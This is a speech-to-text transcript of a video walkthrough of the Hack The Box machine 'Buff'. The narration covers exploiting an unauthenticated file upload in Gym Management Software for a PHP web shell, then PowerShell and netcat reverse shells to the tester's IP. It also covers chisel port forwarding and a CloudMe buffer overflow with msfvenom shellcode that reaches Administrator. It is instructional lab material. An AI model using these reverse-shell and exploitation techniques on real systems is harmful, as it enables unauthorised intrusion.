 what's going on youtube this is ipsec i'm doing buff from hack the box which was a relatively easy windows machine that was all about enumerating what is on the box the very first step involves finding out the web applications using software called gym management software and looking at exploit db there's a known vulnerability against it that's just a unauthenticated image upload they can trick the image uploader into uploading php files and gain access on the box once on the box you enumerate the applications and you can see in the downloads folder there's a program called that's either cloud sync or cloud me but it's vulnerable to a buffer overflow again searching exploit db and changing out the shell code with some of your own you get code execution on the box as administrator so with that being said let's just jump in as always we're going to begin with it and map so dash sc for default scripts sv enumerate versions oh a output all formats and we want to put it in the nmap directory but first i have to create the nmap directory we can call the file buff and then the ip address which is 10 10 10 198. before i run that i do want to run sudo and add dash v so it shows us open ports as it finds them and we can see right off the bat we have a hit on port 8080 so i'm going to go over to firefox and go to 10 10 10 198 port 8080 and let's see what we get it looks like some type of gym page we have about fitness there the title is mr ben's bro hut and yeah um at the very bottom we have some type of copyright so i'm going to copy that but before i look into it i am going to look at the source of this page and i'm just saying if i notice anything like wp dash which would indicate wordpress joomla drupal etc don't really see too much here we do have this projectworlds.in so i'm going to check that website just to see if it says exactly what this is and it looks like some site to learn how to code or hire developers so it's not gonna be too helpful to us um i guess we're gonna start off go buster so we have some type of recon running in the background while we look so go buster dir dash u for url i think maybe it's h i think it's you uh dash w word list opt set list and then word list um not word list let's see where is it discovery web content uh raft small words dot text and when i looked at the source i did notice there was dot php so i'm also going to add dash extension php dash o for out file and we'll just call this gobuster.out and we'll let this one run so while that goes let's poke around at the site um one of the things i always like doing is finding an image and then downloading with wget and looking at the metadata so i'm gonna do wget on this url it's gonna download the image i'm gonna run exif tool on the image and we see it was placed on the server around june 6 uh yeah june 16th of 2020. i just like doing this because if you see super old images it could just be indication that the server has been around for a while or the framework is super old but seeing this is only a few months old i'm not too concerned about it so i'm just going to click around on the page we could also try logging in if we get a email address but i don't know any uh usernames or emails to try if it was just saying username i try admin but generally with email i'd have to guess like the whole domain it's probably gonna be like mr ben at bro um buff.htb or something but i don't know that so i'm just clicking around on the page going over to about i'm going to open up contact in a separate tab since the site is going slow looking around for names don't really see anything on this contact page we see made using gym management software 1.0 so i'm just going to go out on a hunch and we're going to run search point on gem management and see if there's an exploit gym management system 1.0 unauthenticated remote code execution sounds good to us so let's take a look at this with search point dash x and look at the exploit um looks like it's documenting quite a bit access upload.php as it doesn't check for an authenticated session so we can check this by going upload.php and come on come back and it looks like it does exist we get some type of error message id we could try question mark id equals please subscribe and see what the next error message is if it gives one it doesn't so for this we'd probably have to look at the website source code to see how this upload request is formatted or just look at the exploit code that someone has already put uh they're doing set id upload.php id equals kamehameha let's see and then here is the code so user get id move uploaded file into the upload directory looks like we can bypass the white list by adding a double extension so it allows jpeg gif png and jpeg with all caps so i'm guessing they just do like jpeg.php or something so we can see how it's writing but instead of going through all the source the one thing i really like doing to figure out what an exploit is doing is just setting it up to um go through rip suite so i'm just gonna do search plate dash m to mirror it and then we're going to edit this exploit and i'm going to guess since this is python they're using the request library so it looks like they are i'm going to go to the top of the exploit and i'm just going to create a proxy variable so proxies is equal to http colon http 12701 8080. so all this is doing is creating a dictionary and going to tell python for http websites use this proxy and this is going to be burp suite if the page was https instead of being http here i would do https so now let's do request and we can see here's a request.get i'm just going to do proxies is equal to proxies and we're going to look for the next one looks like there is one here this is doing a session so s dot get so we can do proxies is equal to proxies here and look for any other s dots and there's a post so i'm going to add the proxies is equal to proxies here it looks like when it does uploading it puts some magic bytes of a png file so the web server thinks it's a png um if you're unfamiliar with magic bytes are let's just save this um it's just the first few bytes of a file that tells it what it is so for instance gif 8 is the magic bytes of a gif so if i echo this to test and we run file against test it's going to tell us it's a gif image even though we know that is not a gif so that's all the magicbytes is i'm going to run this exploit so 48506 http 1010 10 198 i think that's how we run this for most web exploits you just give it the script name and then the url so running this and oh this may be python2 not python3 there we go and we have boku and here's the very first request it's just doing a get let's for this and waiting for it to do the second one if it's going to oh shoot um it's port 8080 we forgot that so let's for this request and now it's doing the upload so we have upload.php id equals kamehameha and then the file is going to be the magicbytes of a png and they're putting a web shell here so it's echo shell exec uh get and telepathy i'm gonna change this just to be um request so we can do either a get or a post um i just like that so much better in web shelves so let's for this request and going here it looks like it has been successful so if we do a dir we can see all we're doing is a get request on kamehameha.php with telepathy equals dir if you go to the history again um telepathy is the variable so this was previously git we added it to be request so if we go back to this request let's go where is it see we have to show everything i think there we go so you can either do it this way or we can now change the request method to put it in the post there's two reasons i like doing post requests number one it's not going to show up in apache access logs uh number two you have less bad characters as a post request so there's less chance your command is going to screw up so now we can either enumerate the box through the server like this and just run like well let's turn burp suite off go like this but the downside to this web shell is it's not persistent so if i try to go up one directory it doesn't do it because it's running cmd every single time i make a request so let's go and do a reverse shell so let's uh let's see we can do it i guess in a we'll do it here and then send the reverse shell to a new pane once we get one so let's make dirt dub dub dub i'm going to copy user share no shang and then shells invoke reverser powershell tcp oneline.ps1 and put it in www.rev.ps1 and i'm just going to look at the shell and we're going to choose which one we want we just have to pick one so i'm going to probably do that first one and i'm going to change this to b 10 10 10 14 2 my ip address and port is going to be 9001 so it looks like that is good we can start a web server up with python3-m http.server and now when we go here once we listen to 9001 we should be able to do powershell iex new object net.web client download string http 1010142 rev port 8000 rev.ps1 so we can try running this and seeing if we get anything we don't have a hit on our server yet so i'm not sure exactly what is going on here looking at this history looks like the command has started there we go it got a hit but it's not doing anything i'm going to send this to repeater i'm going to change the request method go down here see if we get any hits doesn't look like we do let's change it to go back in the get request looks like the server is no longer really responding to us so maybe defender is blocking us so we're hitting a fire one now this is bizarre can we curl 10 10 14 2 port 8 000 see if we hit this we may have to oh yeah we can so our curl definitely worked and we can do that because this looks like it is powershell uh let's do get process can we just run any powershell command here um maybe curls now in windows i'm actually surprised that act worked um i don't know how that worked i'm not used to having the curl command and i thought i was in cmd uh what let's go to proxy here's the upload shell exec so this should be cmd not powershell um what's a powershell command i can do we can do gci period forget child items and if this was powershell it should return something i didn't do a period but it would so we have girl i don't know why we have girl but we have it so we can keep using it i'm not sure why i can no longer do powershell to download that file so what i'm going to do is we're just going to use netcat so i'm going to do locatenc.exe and we're going to copy this into dub dub dub and we're going to curl 10 10 14 2 port 8000 nc.exe o nc.exe so this should be able to download ncat and it looks like we have so we can do nc.exe 10 10 14 2 0. 9001-e powershell and now we have a connection so i'm going to send that to a new pane i thought i was send a pain to why can't you join uh weird see three okay not sure why i can't can't um send this to a different pane but now we have a powershell so if i do cd dot dot we can actually go up a directory um there is i guess amsi on this so let's see that block that nope i'm not sure exactly what got blocked i'm guessing this rev.php had got blocked by amsi and that's why we couldn't do the reverse shell um what i want to do is copy win p's over here so i'm going to just opt privilege escalation script awesome sweet i'm just going to do a get pull to update this i always like running the latest so if we go to win ps win ps exe win ps uh binary or bin x i'm not sure 64 32 let's just try 64 real quick release cp win ps.exe 2 hdb dub and we can curl 10 10 14 2 when let's see it's probably capital p east and download this file this can potentially take a second uh we did not specify port 8001 or 8 000 10 10 14 2 8 000 win ps.ex ps.exe and see it is now downloading so i'm going to wait for this command to finish and then we can run windp's exe and get any type of privacy this can find so i'm going to speed up the video until this finishes and now that it's done let's just go up to the top so uh i'm just going to search for curl and now we'll page down going over anything that is red um there is a few privates that we could potentially do based upon i guess the os build version i'm going to probably ignore these until the end i hate doing any of the like um cvs based upon just windows version i find them not to be too stable so let's go down looks like we have red that's just highlighting name sean let's see system the one thing i probably should do is do a who am i slash all to see if i have the sc impersonate token which would allow me to do like juicy potato or rogue potato laps lsa cred nothing cash logins nothing too interesting so far let's see looks like we can go into the sql and users sean directory and there is a logged on user called administrator so that is interesting probably should hunt down processes running by administrator to see if there's anything we can access since he is logged in a login credential found but no password see this is permissions on binaries so we have sql running so we may want to access the database to see if there's any credentials in here that's win ps http nothing too interesting see modifiable services nothing red we can write into the c colon backslash examp and i'm not really going to focus too much on to this one mainly because i don't think we can restart the web server so even if we poisoned the like executable in that directory we have no way to restart to get it to execute unquoted spaces that could be worth coming back to but these are like login scripts so we have to reboot the box for that to work uh we have a few ports listing on localhost 3306. this is going to be mysql uh 1900 i don't know these two ports i don't know so anything else oh these are udp ports so we have mysql listening and nothing really so we can go into the home directory so i'm going to cd slash users there was the user name known sean that we could go in and we can do dir and desktop to see what's here user.txt we can take a look at his entire home directory so looking in documents oh there is tasks.bat so i'm going to do um get content on documents tasks to see what is in this and it looks like it's just doing a start on the web server so let's take a look at what's in the next directory down which would be downloads and we have this cloudme1112.exe so i'm going to take a look at this uh let's go to search plate again cloud me to see if there's anything there and we have 1.11.2 another python script so i'm going to take a look at this we'll look at the code and see if this can be beneficial so it's saying the target is localhost it's doing padding of a bunch of knobs which is backslash x90 1052 then overwriting eip with a push esp and return and then i'm guessing all the shell code is at the location of esp not exactly sure what knobs is doing there but let's go down so yeah buff padding which is going to be 1052 then write down eip which is the memory address 68842b5 um because it's a little endian uh then putting a bunch of knobs which are no operation doesn't do anything i'm guessing that's just to guarantee our payloads where we want so eip is going to execute what is an esp so if we don't write at the very beginning of esp it's going to be fine like if we wrote a few bytes before esp um the knops will handle that so it's just doing a sled to get into code execution i don't think we actually have to do that it's weird to do with this type of attack but oh well payload and then overrun so maybe you have to put something after the payload to make sure the service crashes uh then we have connect port 8888 was that actually running um eight eight eighty it's not running according to uh win peace let's do netstat-a-n uh let's see i don't see 888 there's nothing running that's bizarre so either we have to do something to get this running or maybe someone just exploited this box poorly and crash that port so i'm going to just do a sanity check and revert this box to make sure that port should not be listening because i think it should be based upon that being in the directory so let's revert the box and then re-exploit this thing the box has been reverted so i'm just going to rerun this web exploit again and we're going to check if that port is listening so netstat dash a n and then we can do find string 888 and it doesn't look like it is listening that is bizarre now we can do task list and we do see cloudme.exe is running so maybe it's not running over the standard port that's in the exploit or maybe the exploits just or netstat's not telling us the ports open so i'm going to curl 10 10 14 2 port 8000 nc.exe and we'll put it back here and we're going to try connecting to localhost 888. so nc exe zv to test the port status localhost 8888 and see what this says maybe we have to do dot backslash or maybe that was a signifying the port was not open let's try nc.exe zv localhost 8080. since we know that's up um let's just send ourselves a reverse shell i'm going to do it in this pane all vmp 9001 let's do nc.exe 10 10 14 2 9 000 1 e power shell so we have the session here let's wait for it to actually give us a prompt and then we can try that nc command again come on powershell there we go nc exe localhost zv localhost 8888 see if this one actually gives it and we get connection refused so um we know the port is not open and do netstat a n find string 127.001 and let's see if we get anything so we have a few ports open the only one that is listing though is mysql we don't have anything else listening um this whole box has now become very odd because i expected to see 888 let's see i guess we can take a look at my sequel while we're waiting for that port to open up to see if it does but we know the program's running because we got cloudme.exe i just don't know why it didn't decide to open up the port but oh well let's um copy over chisel so i'm going to go and download chisel from github so just go to chisel github and we're going to download the executable and the linux one so going over to releases uh we want to download amd 64. and then i also want to download windows 64 and we'll download windows oh if we have an issue we'll download windows 32 i want to actually save not open okay so let's go back here we can move downloads chisel windows to here gunzip dash d to unzip it and we can rename it to chisel.exe right that's an executable it is so now we can download it with curl 10 10 14 2 port 9 000 uh eight thousand chisel.exe dash oh chisel.exe and this is going to allow us to hit port 3306 on localhost so the next thing we need to do is uh get the regular chisel the linux version so i'm going to move downloads chisel here gunzip dash d to uncompress it and let's just rename it to chisel and make it executable i'm going to execute chisel with server dash dash reverse and port will do 9002 if you didn't do dash dash port and something's listing on the port it wants it's going to give you a weird error message that you think like the application's not working this is just the port is in use so we'll do port 9002 chisel.exe client 10 10 14 2 9 000 2. we're going to do a reverse forward on port 3306 and then localhost port 3306 i'm also going to do a second one on port 8888 and do the same thing in case that port ever opens back up and we may want to do this from a powershell because i'm not sure if that's actually going to work through this web shell since apache is eventually going to close the socket or like apache has a time link that a thread can be opened for so i'm guessing it's going to die soon but we can try doing a nc localhost 3306 now and we do get mariah db which i believe this is going to be going through chisel as long as our sql service isn't started which i don't think it is so now let's go find the actual config in gym and this will have the password so we need to find probably like db.php or config.php let's see we got att profile maybe include about contact edit facilities home index packages register let's just look at register because this is going to interact with the database so since it interacts with the database we can look at its include and see what it does so include we probably want to go in this includes directory so cd includes or maybe it's just include and let's see there's db underscore connect dot php do we have credentials here misspelled type type db connect dot php so root with no password we could have just guessed that so we can try mysql dash u root uh dash p maybe dash h 127.001 um is it lowercase there we go so now we have connected to the box we can do um show databases and we can see all the databases on this there is a information schema mysql phpmyadmin table and test i'm going to try looking at the test table so use test show tables nothing here we can use table show tables nothing here uh hold on one second uh ss lmpt grep3306 so that is definitely chisel i just wanted to make sure i'm 100 positive i am on um the mysql instance of buff and not my localhost so maybe use phpmyadmin show tables and this is uh select stir from pma users nothing so we don't really have anything in this database um i would have expected to see a table that handles this web application maybe called buff and that table would have credentials to try to log into this web app but i don't see that at all which is bizarre yeah it's using this table so her user password table for the web application so use table if our session's still up looks like maybe uh oh no there we go so use table this is just going extremely slow now show tables yeah this is empty so there's nothing here um we can try this netstat-a-n again to see if port 8888 magically decided to start listening and no it's still not listening i am not sure what is going on here so i'm just going to give the box some time to see if it starts listening all of a sudden maybe it takes some time for it actually to start listening on that port i have no idea what's going on so just going to give the box some time and we'll come back to it it's been quite a while so i'm going to try it again with netstat a n find string 8888 and we see the port is now listening so i'm going to go over to our exploit and we're going to figure out how this works so we want to try this python one so i'm going to do search point dash m to mirror it and then let's just go and edit it and see how this works oh we already did um my bad uh we looked at this we just have to replace this um msf venom query so let's go and grep dash i msf venom out of this and apologies if you heard my dog burke back there i'm not sure if the microphone picked it up or not but we're just going to copy this code and i'm going to do msf venom dash l payloads to list all the available payloads to us i want to do like a reverse shell so we're going to look for that payload um let's just specify lhost is equal to 10 10 14 2 hello port is equal to uh can we listen on 9001 still if i use that lb and p i can so 9001 and we just defined what payload to put here so it's windows something i'm going to search for reverse underscore shell and the reason why i'm using the underscore is well um it wouldn't be a stage payload um let's see let's go for windows backslash and find something i don't want x64 uh there we go so it's probably a shell i don't want shell slash um shell slash i would have to use um msf handler or metasploit to catch the shell because it's not to put the full reverse shell it's only going to put a portion of it um i can probably just put window shell underscore reverse let's see if this works real quick so paste like that let's see if this prints anything so again when it's um type underscore then finishes it's a stage list payload which is going to be a little bit bigger than the staged if it's that and then a slash then it's going to just pretty much be like download shell code off a metasploit server then execute to do the final piece which lets it be smaller um so like if you did meterpreter which i guess we can show after we do this um we'll explain that more so let's just go 483 and we'll put our new payload and i have to do payload is equal to buff and i'll just get rid of that comment listen on localhost and run it and nothing happens oh there we go it just took some time we do who am i and we are administrator and we go cd backslash users administrator go into his desktop and grab root.text but as i was saying um if we look at meterpreter so if we go back to this and do uh windows interpreter reverse tcp this is gonna be a stageless version of merterpter which is gonna be probably huge uh 11 compatible encoders it's attempting so we'll see how big this payload actually is it's been like five minutes and it's still trying to do some type of encoding so i'm going to get rid of these bad characters because that can make it take some more time and maybe this will speed it up hopefully it just takes a few seconds to spit out the code there we go so definitely didn't like not doing any bad characters but you can see just how big this is when it's stageless um come on let's go to the top msf venom um it's even bigger than my t-mux's output so it's pretty done big let's just do um slash reverse tcp and give you an idea how big this one is because um yeah so it went from larger than my whole tmux history to just 354 bytes because again this isn't putting the entire material on the box it's just putting enough to call back to the metasploit server and download the raster interpreter we can do dash oh i think for out file and say staged let's see if dash o is out there we go and we can do an underscore and do stage lists and then we're going to compare the size of both of these it's not a good comparison because we have a lot of random text or whoops i did it wrong that is still a slash this is the underscore but in a size comparison i'm going to be grabbing all this i should have taken the format off we'll put raw so it just put the straight bytes you can see payload size is 175 000 bytes where up here it was just 354 and if you looked at the actual buff i mean this is probably going to be an elf file so if we look at stageless uh let's see i was expecting to see like an mz header let's do v stageless and we can print buff python3 stage list to temp we can do file temp oh yeah it is a mz header so this is just a straight meterpreter binary um we'd have to do dot d code i believe because right now it just wrote a byte string so if we went into this and deleted the very first character and probably the very last quote uh that's not gonna be it um it didn't print correctly we have to decode it as a binary to get that working but you can see the difference between staged and stageless in sizes so that'll probably conclude this video hope you guys enjoyed take care and i'll see you all next week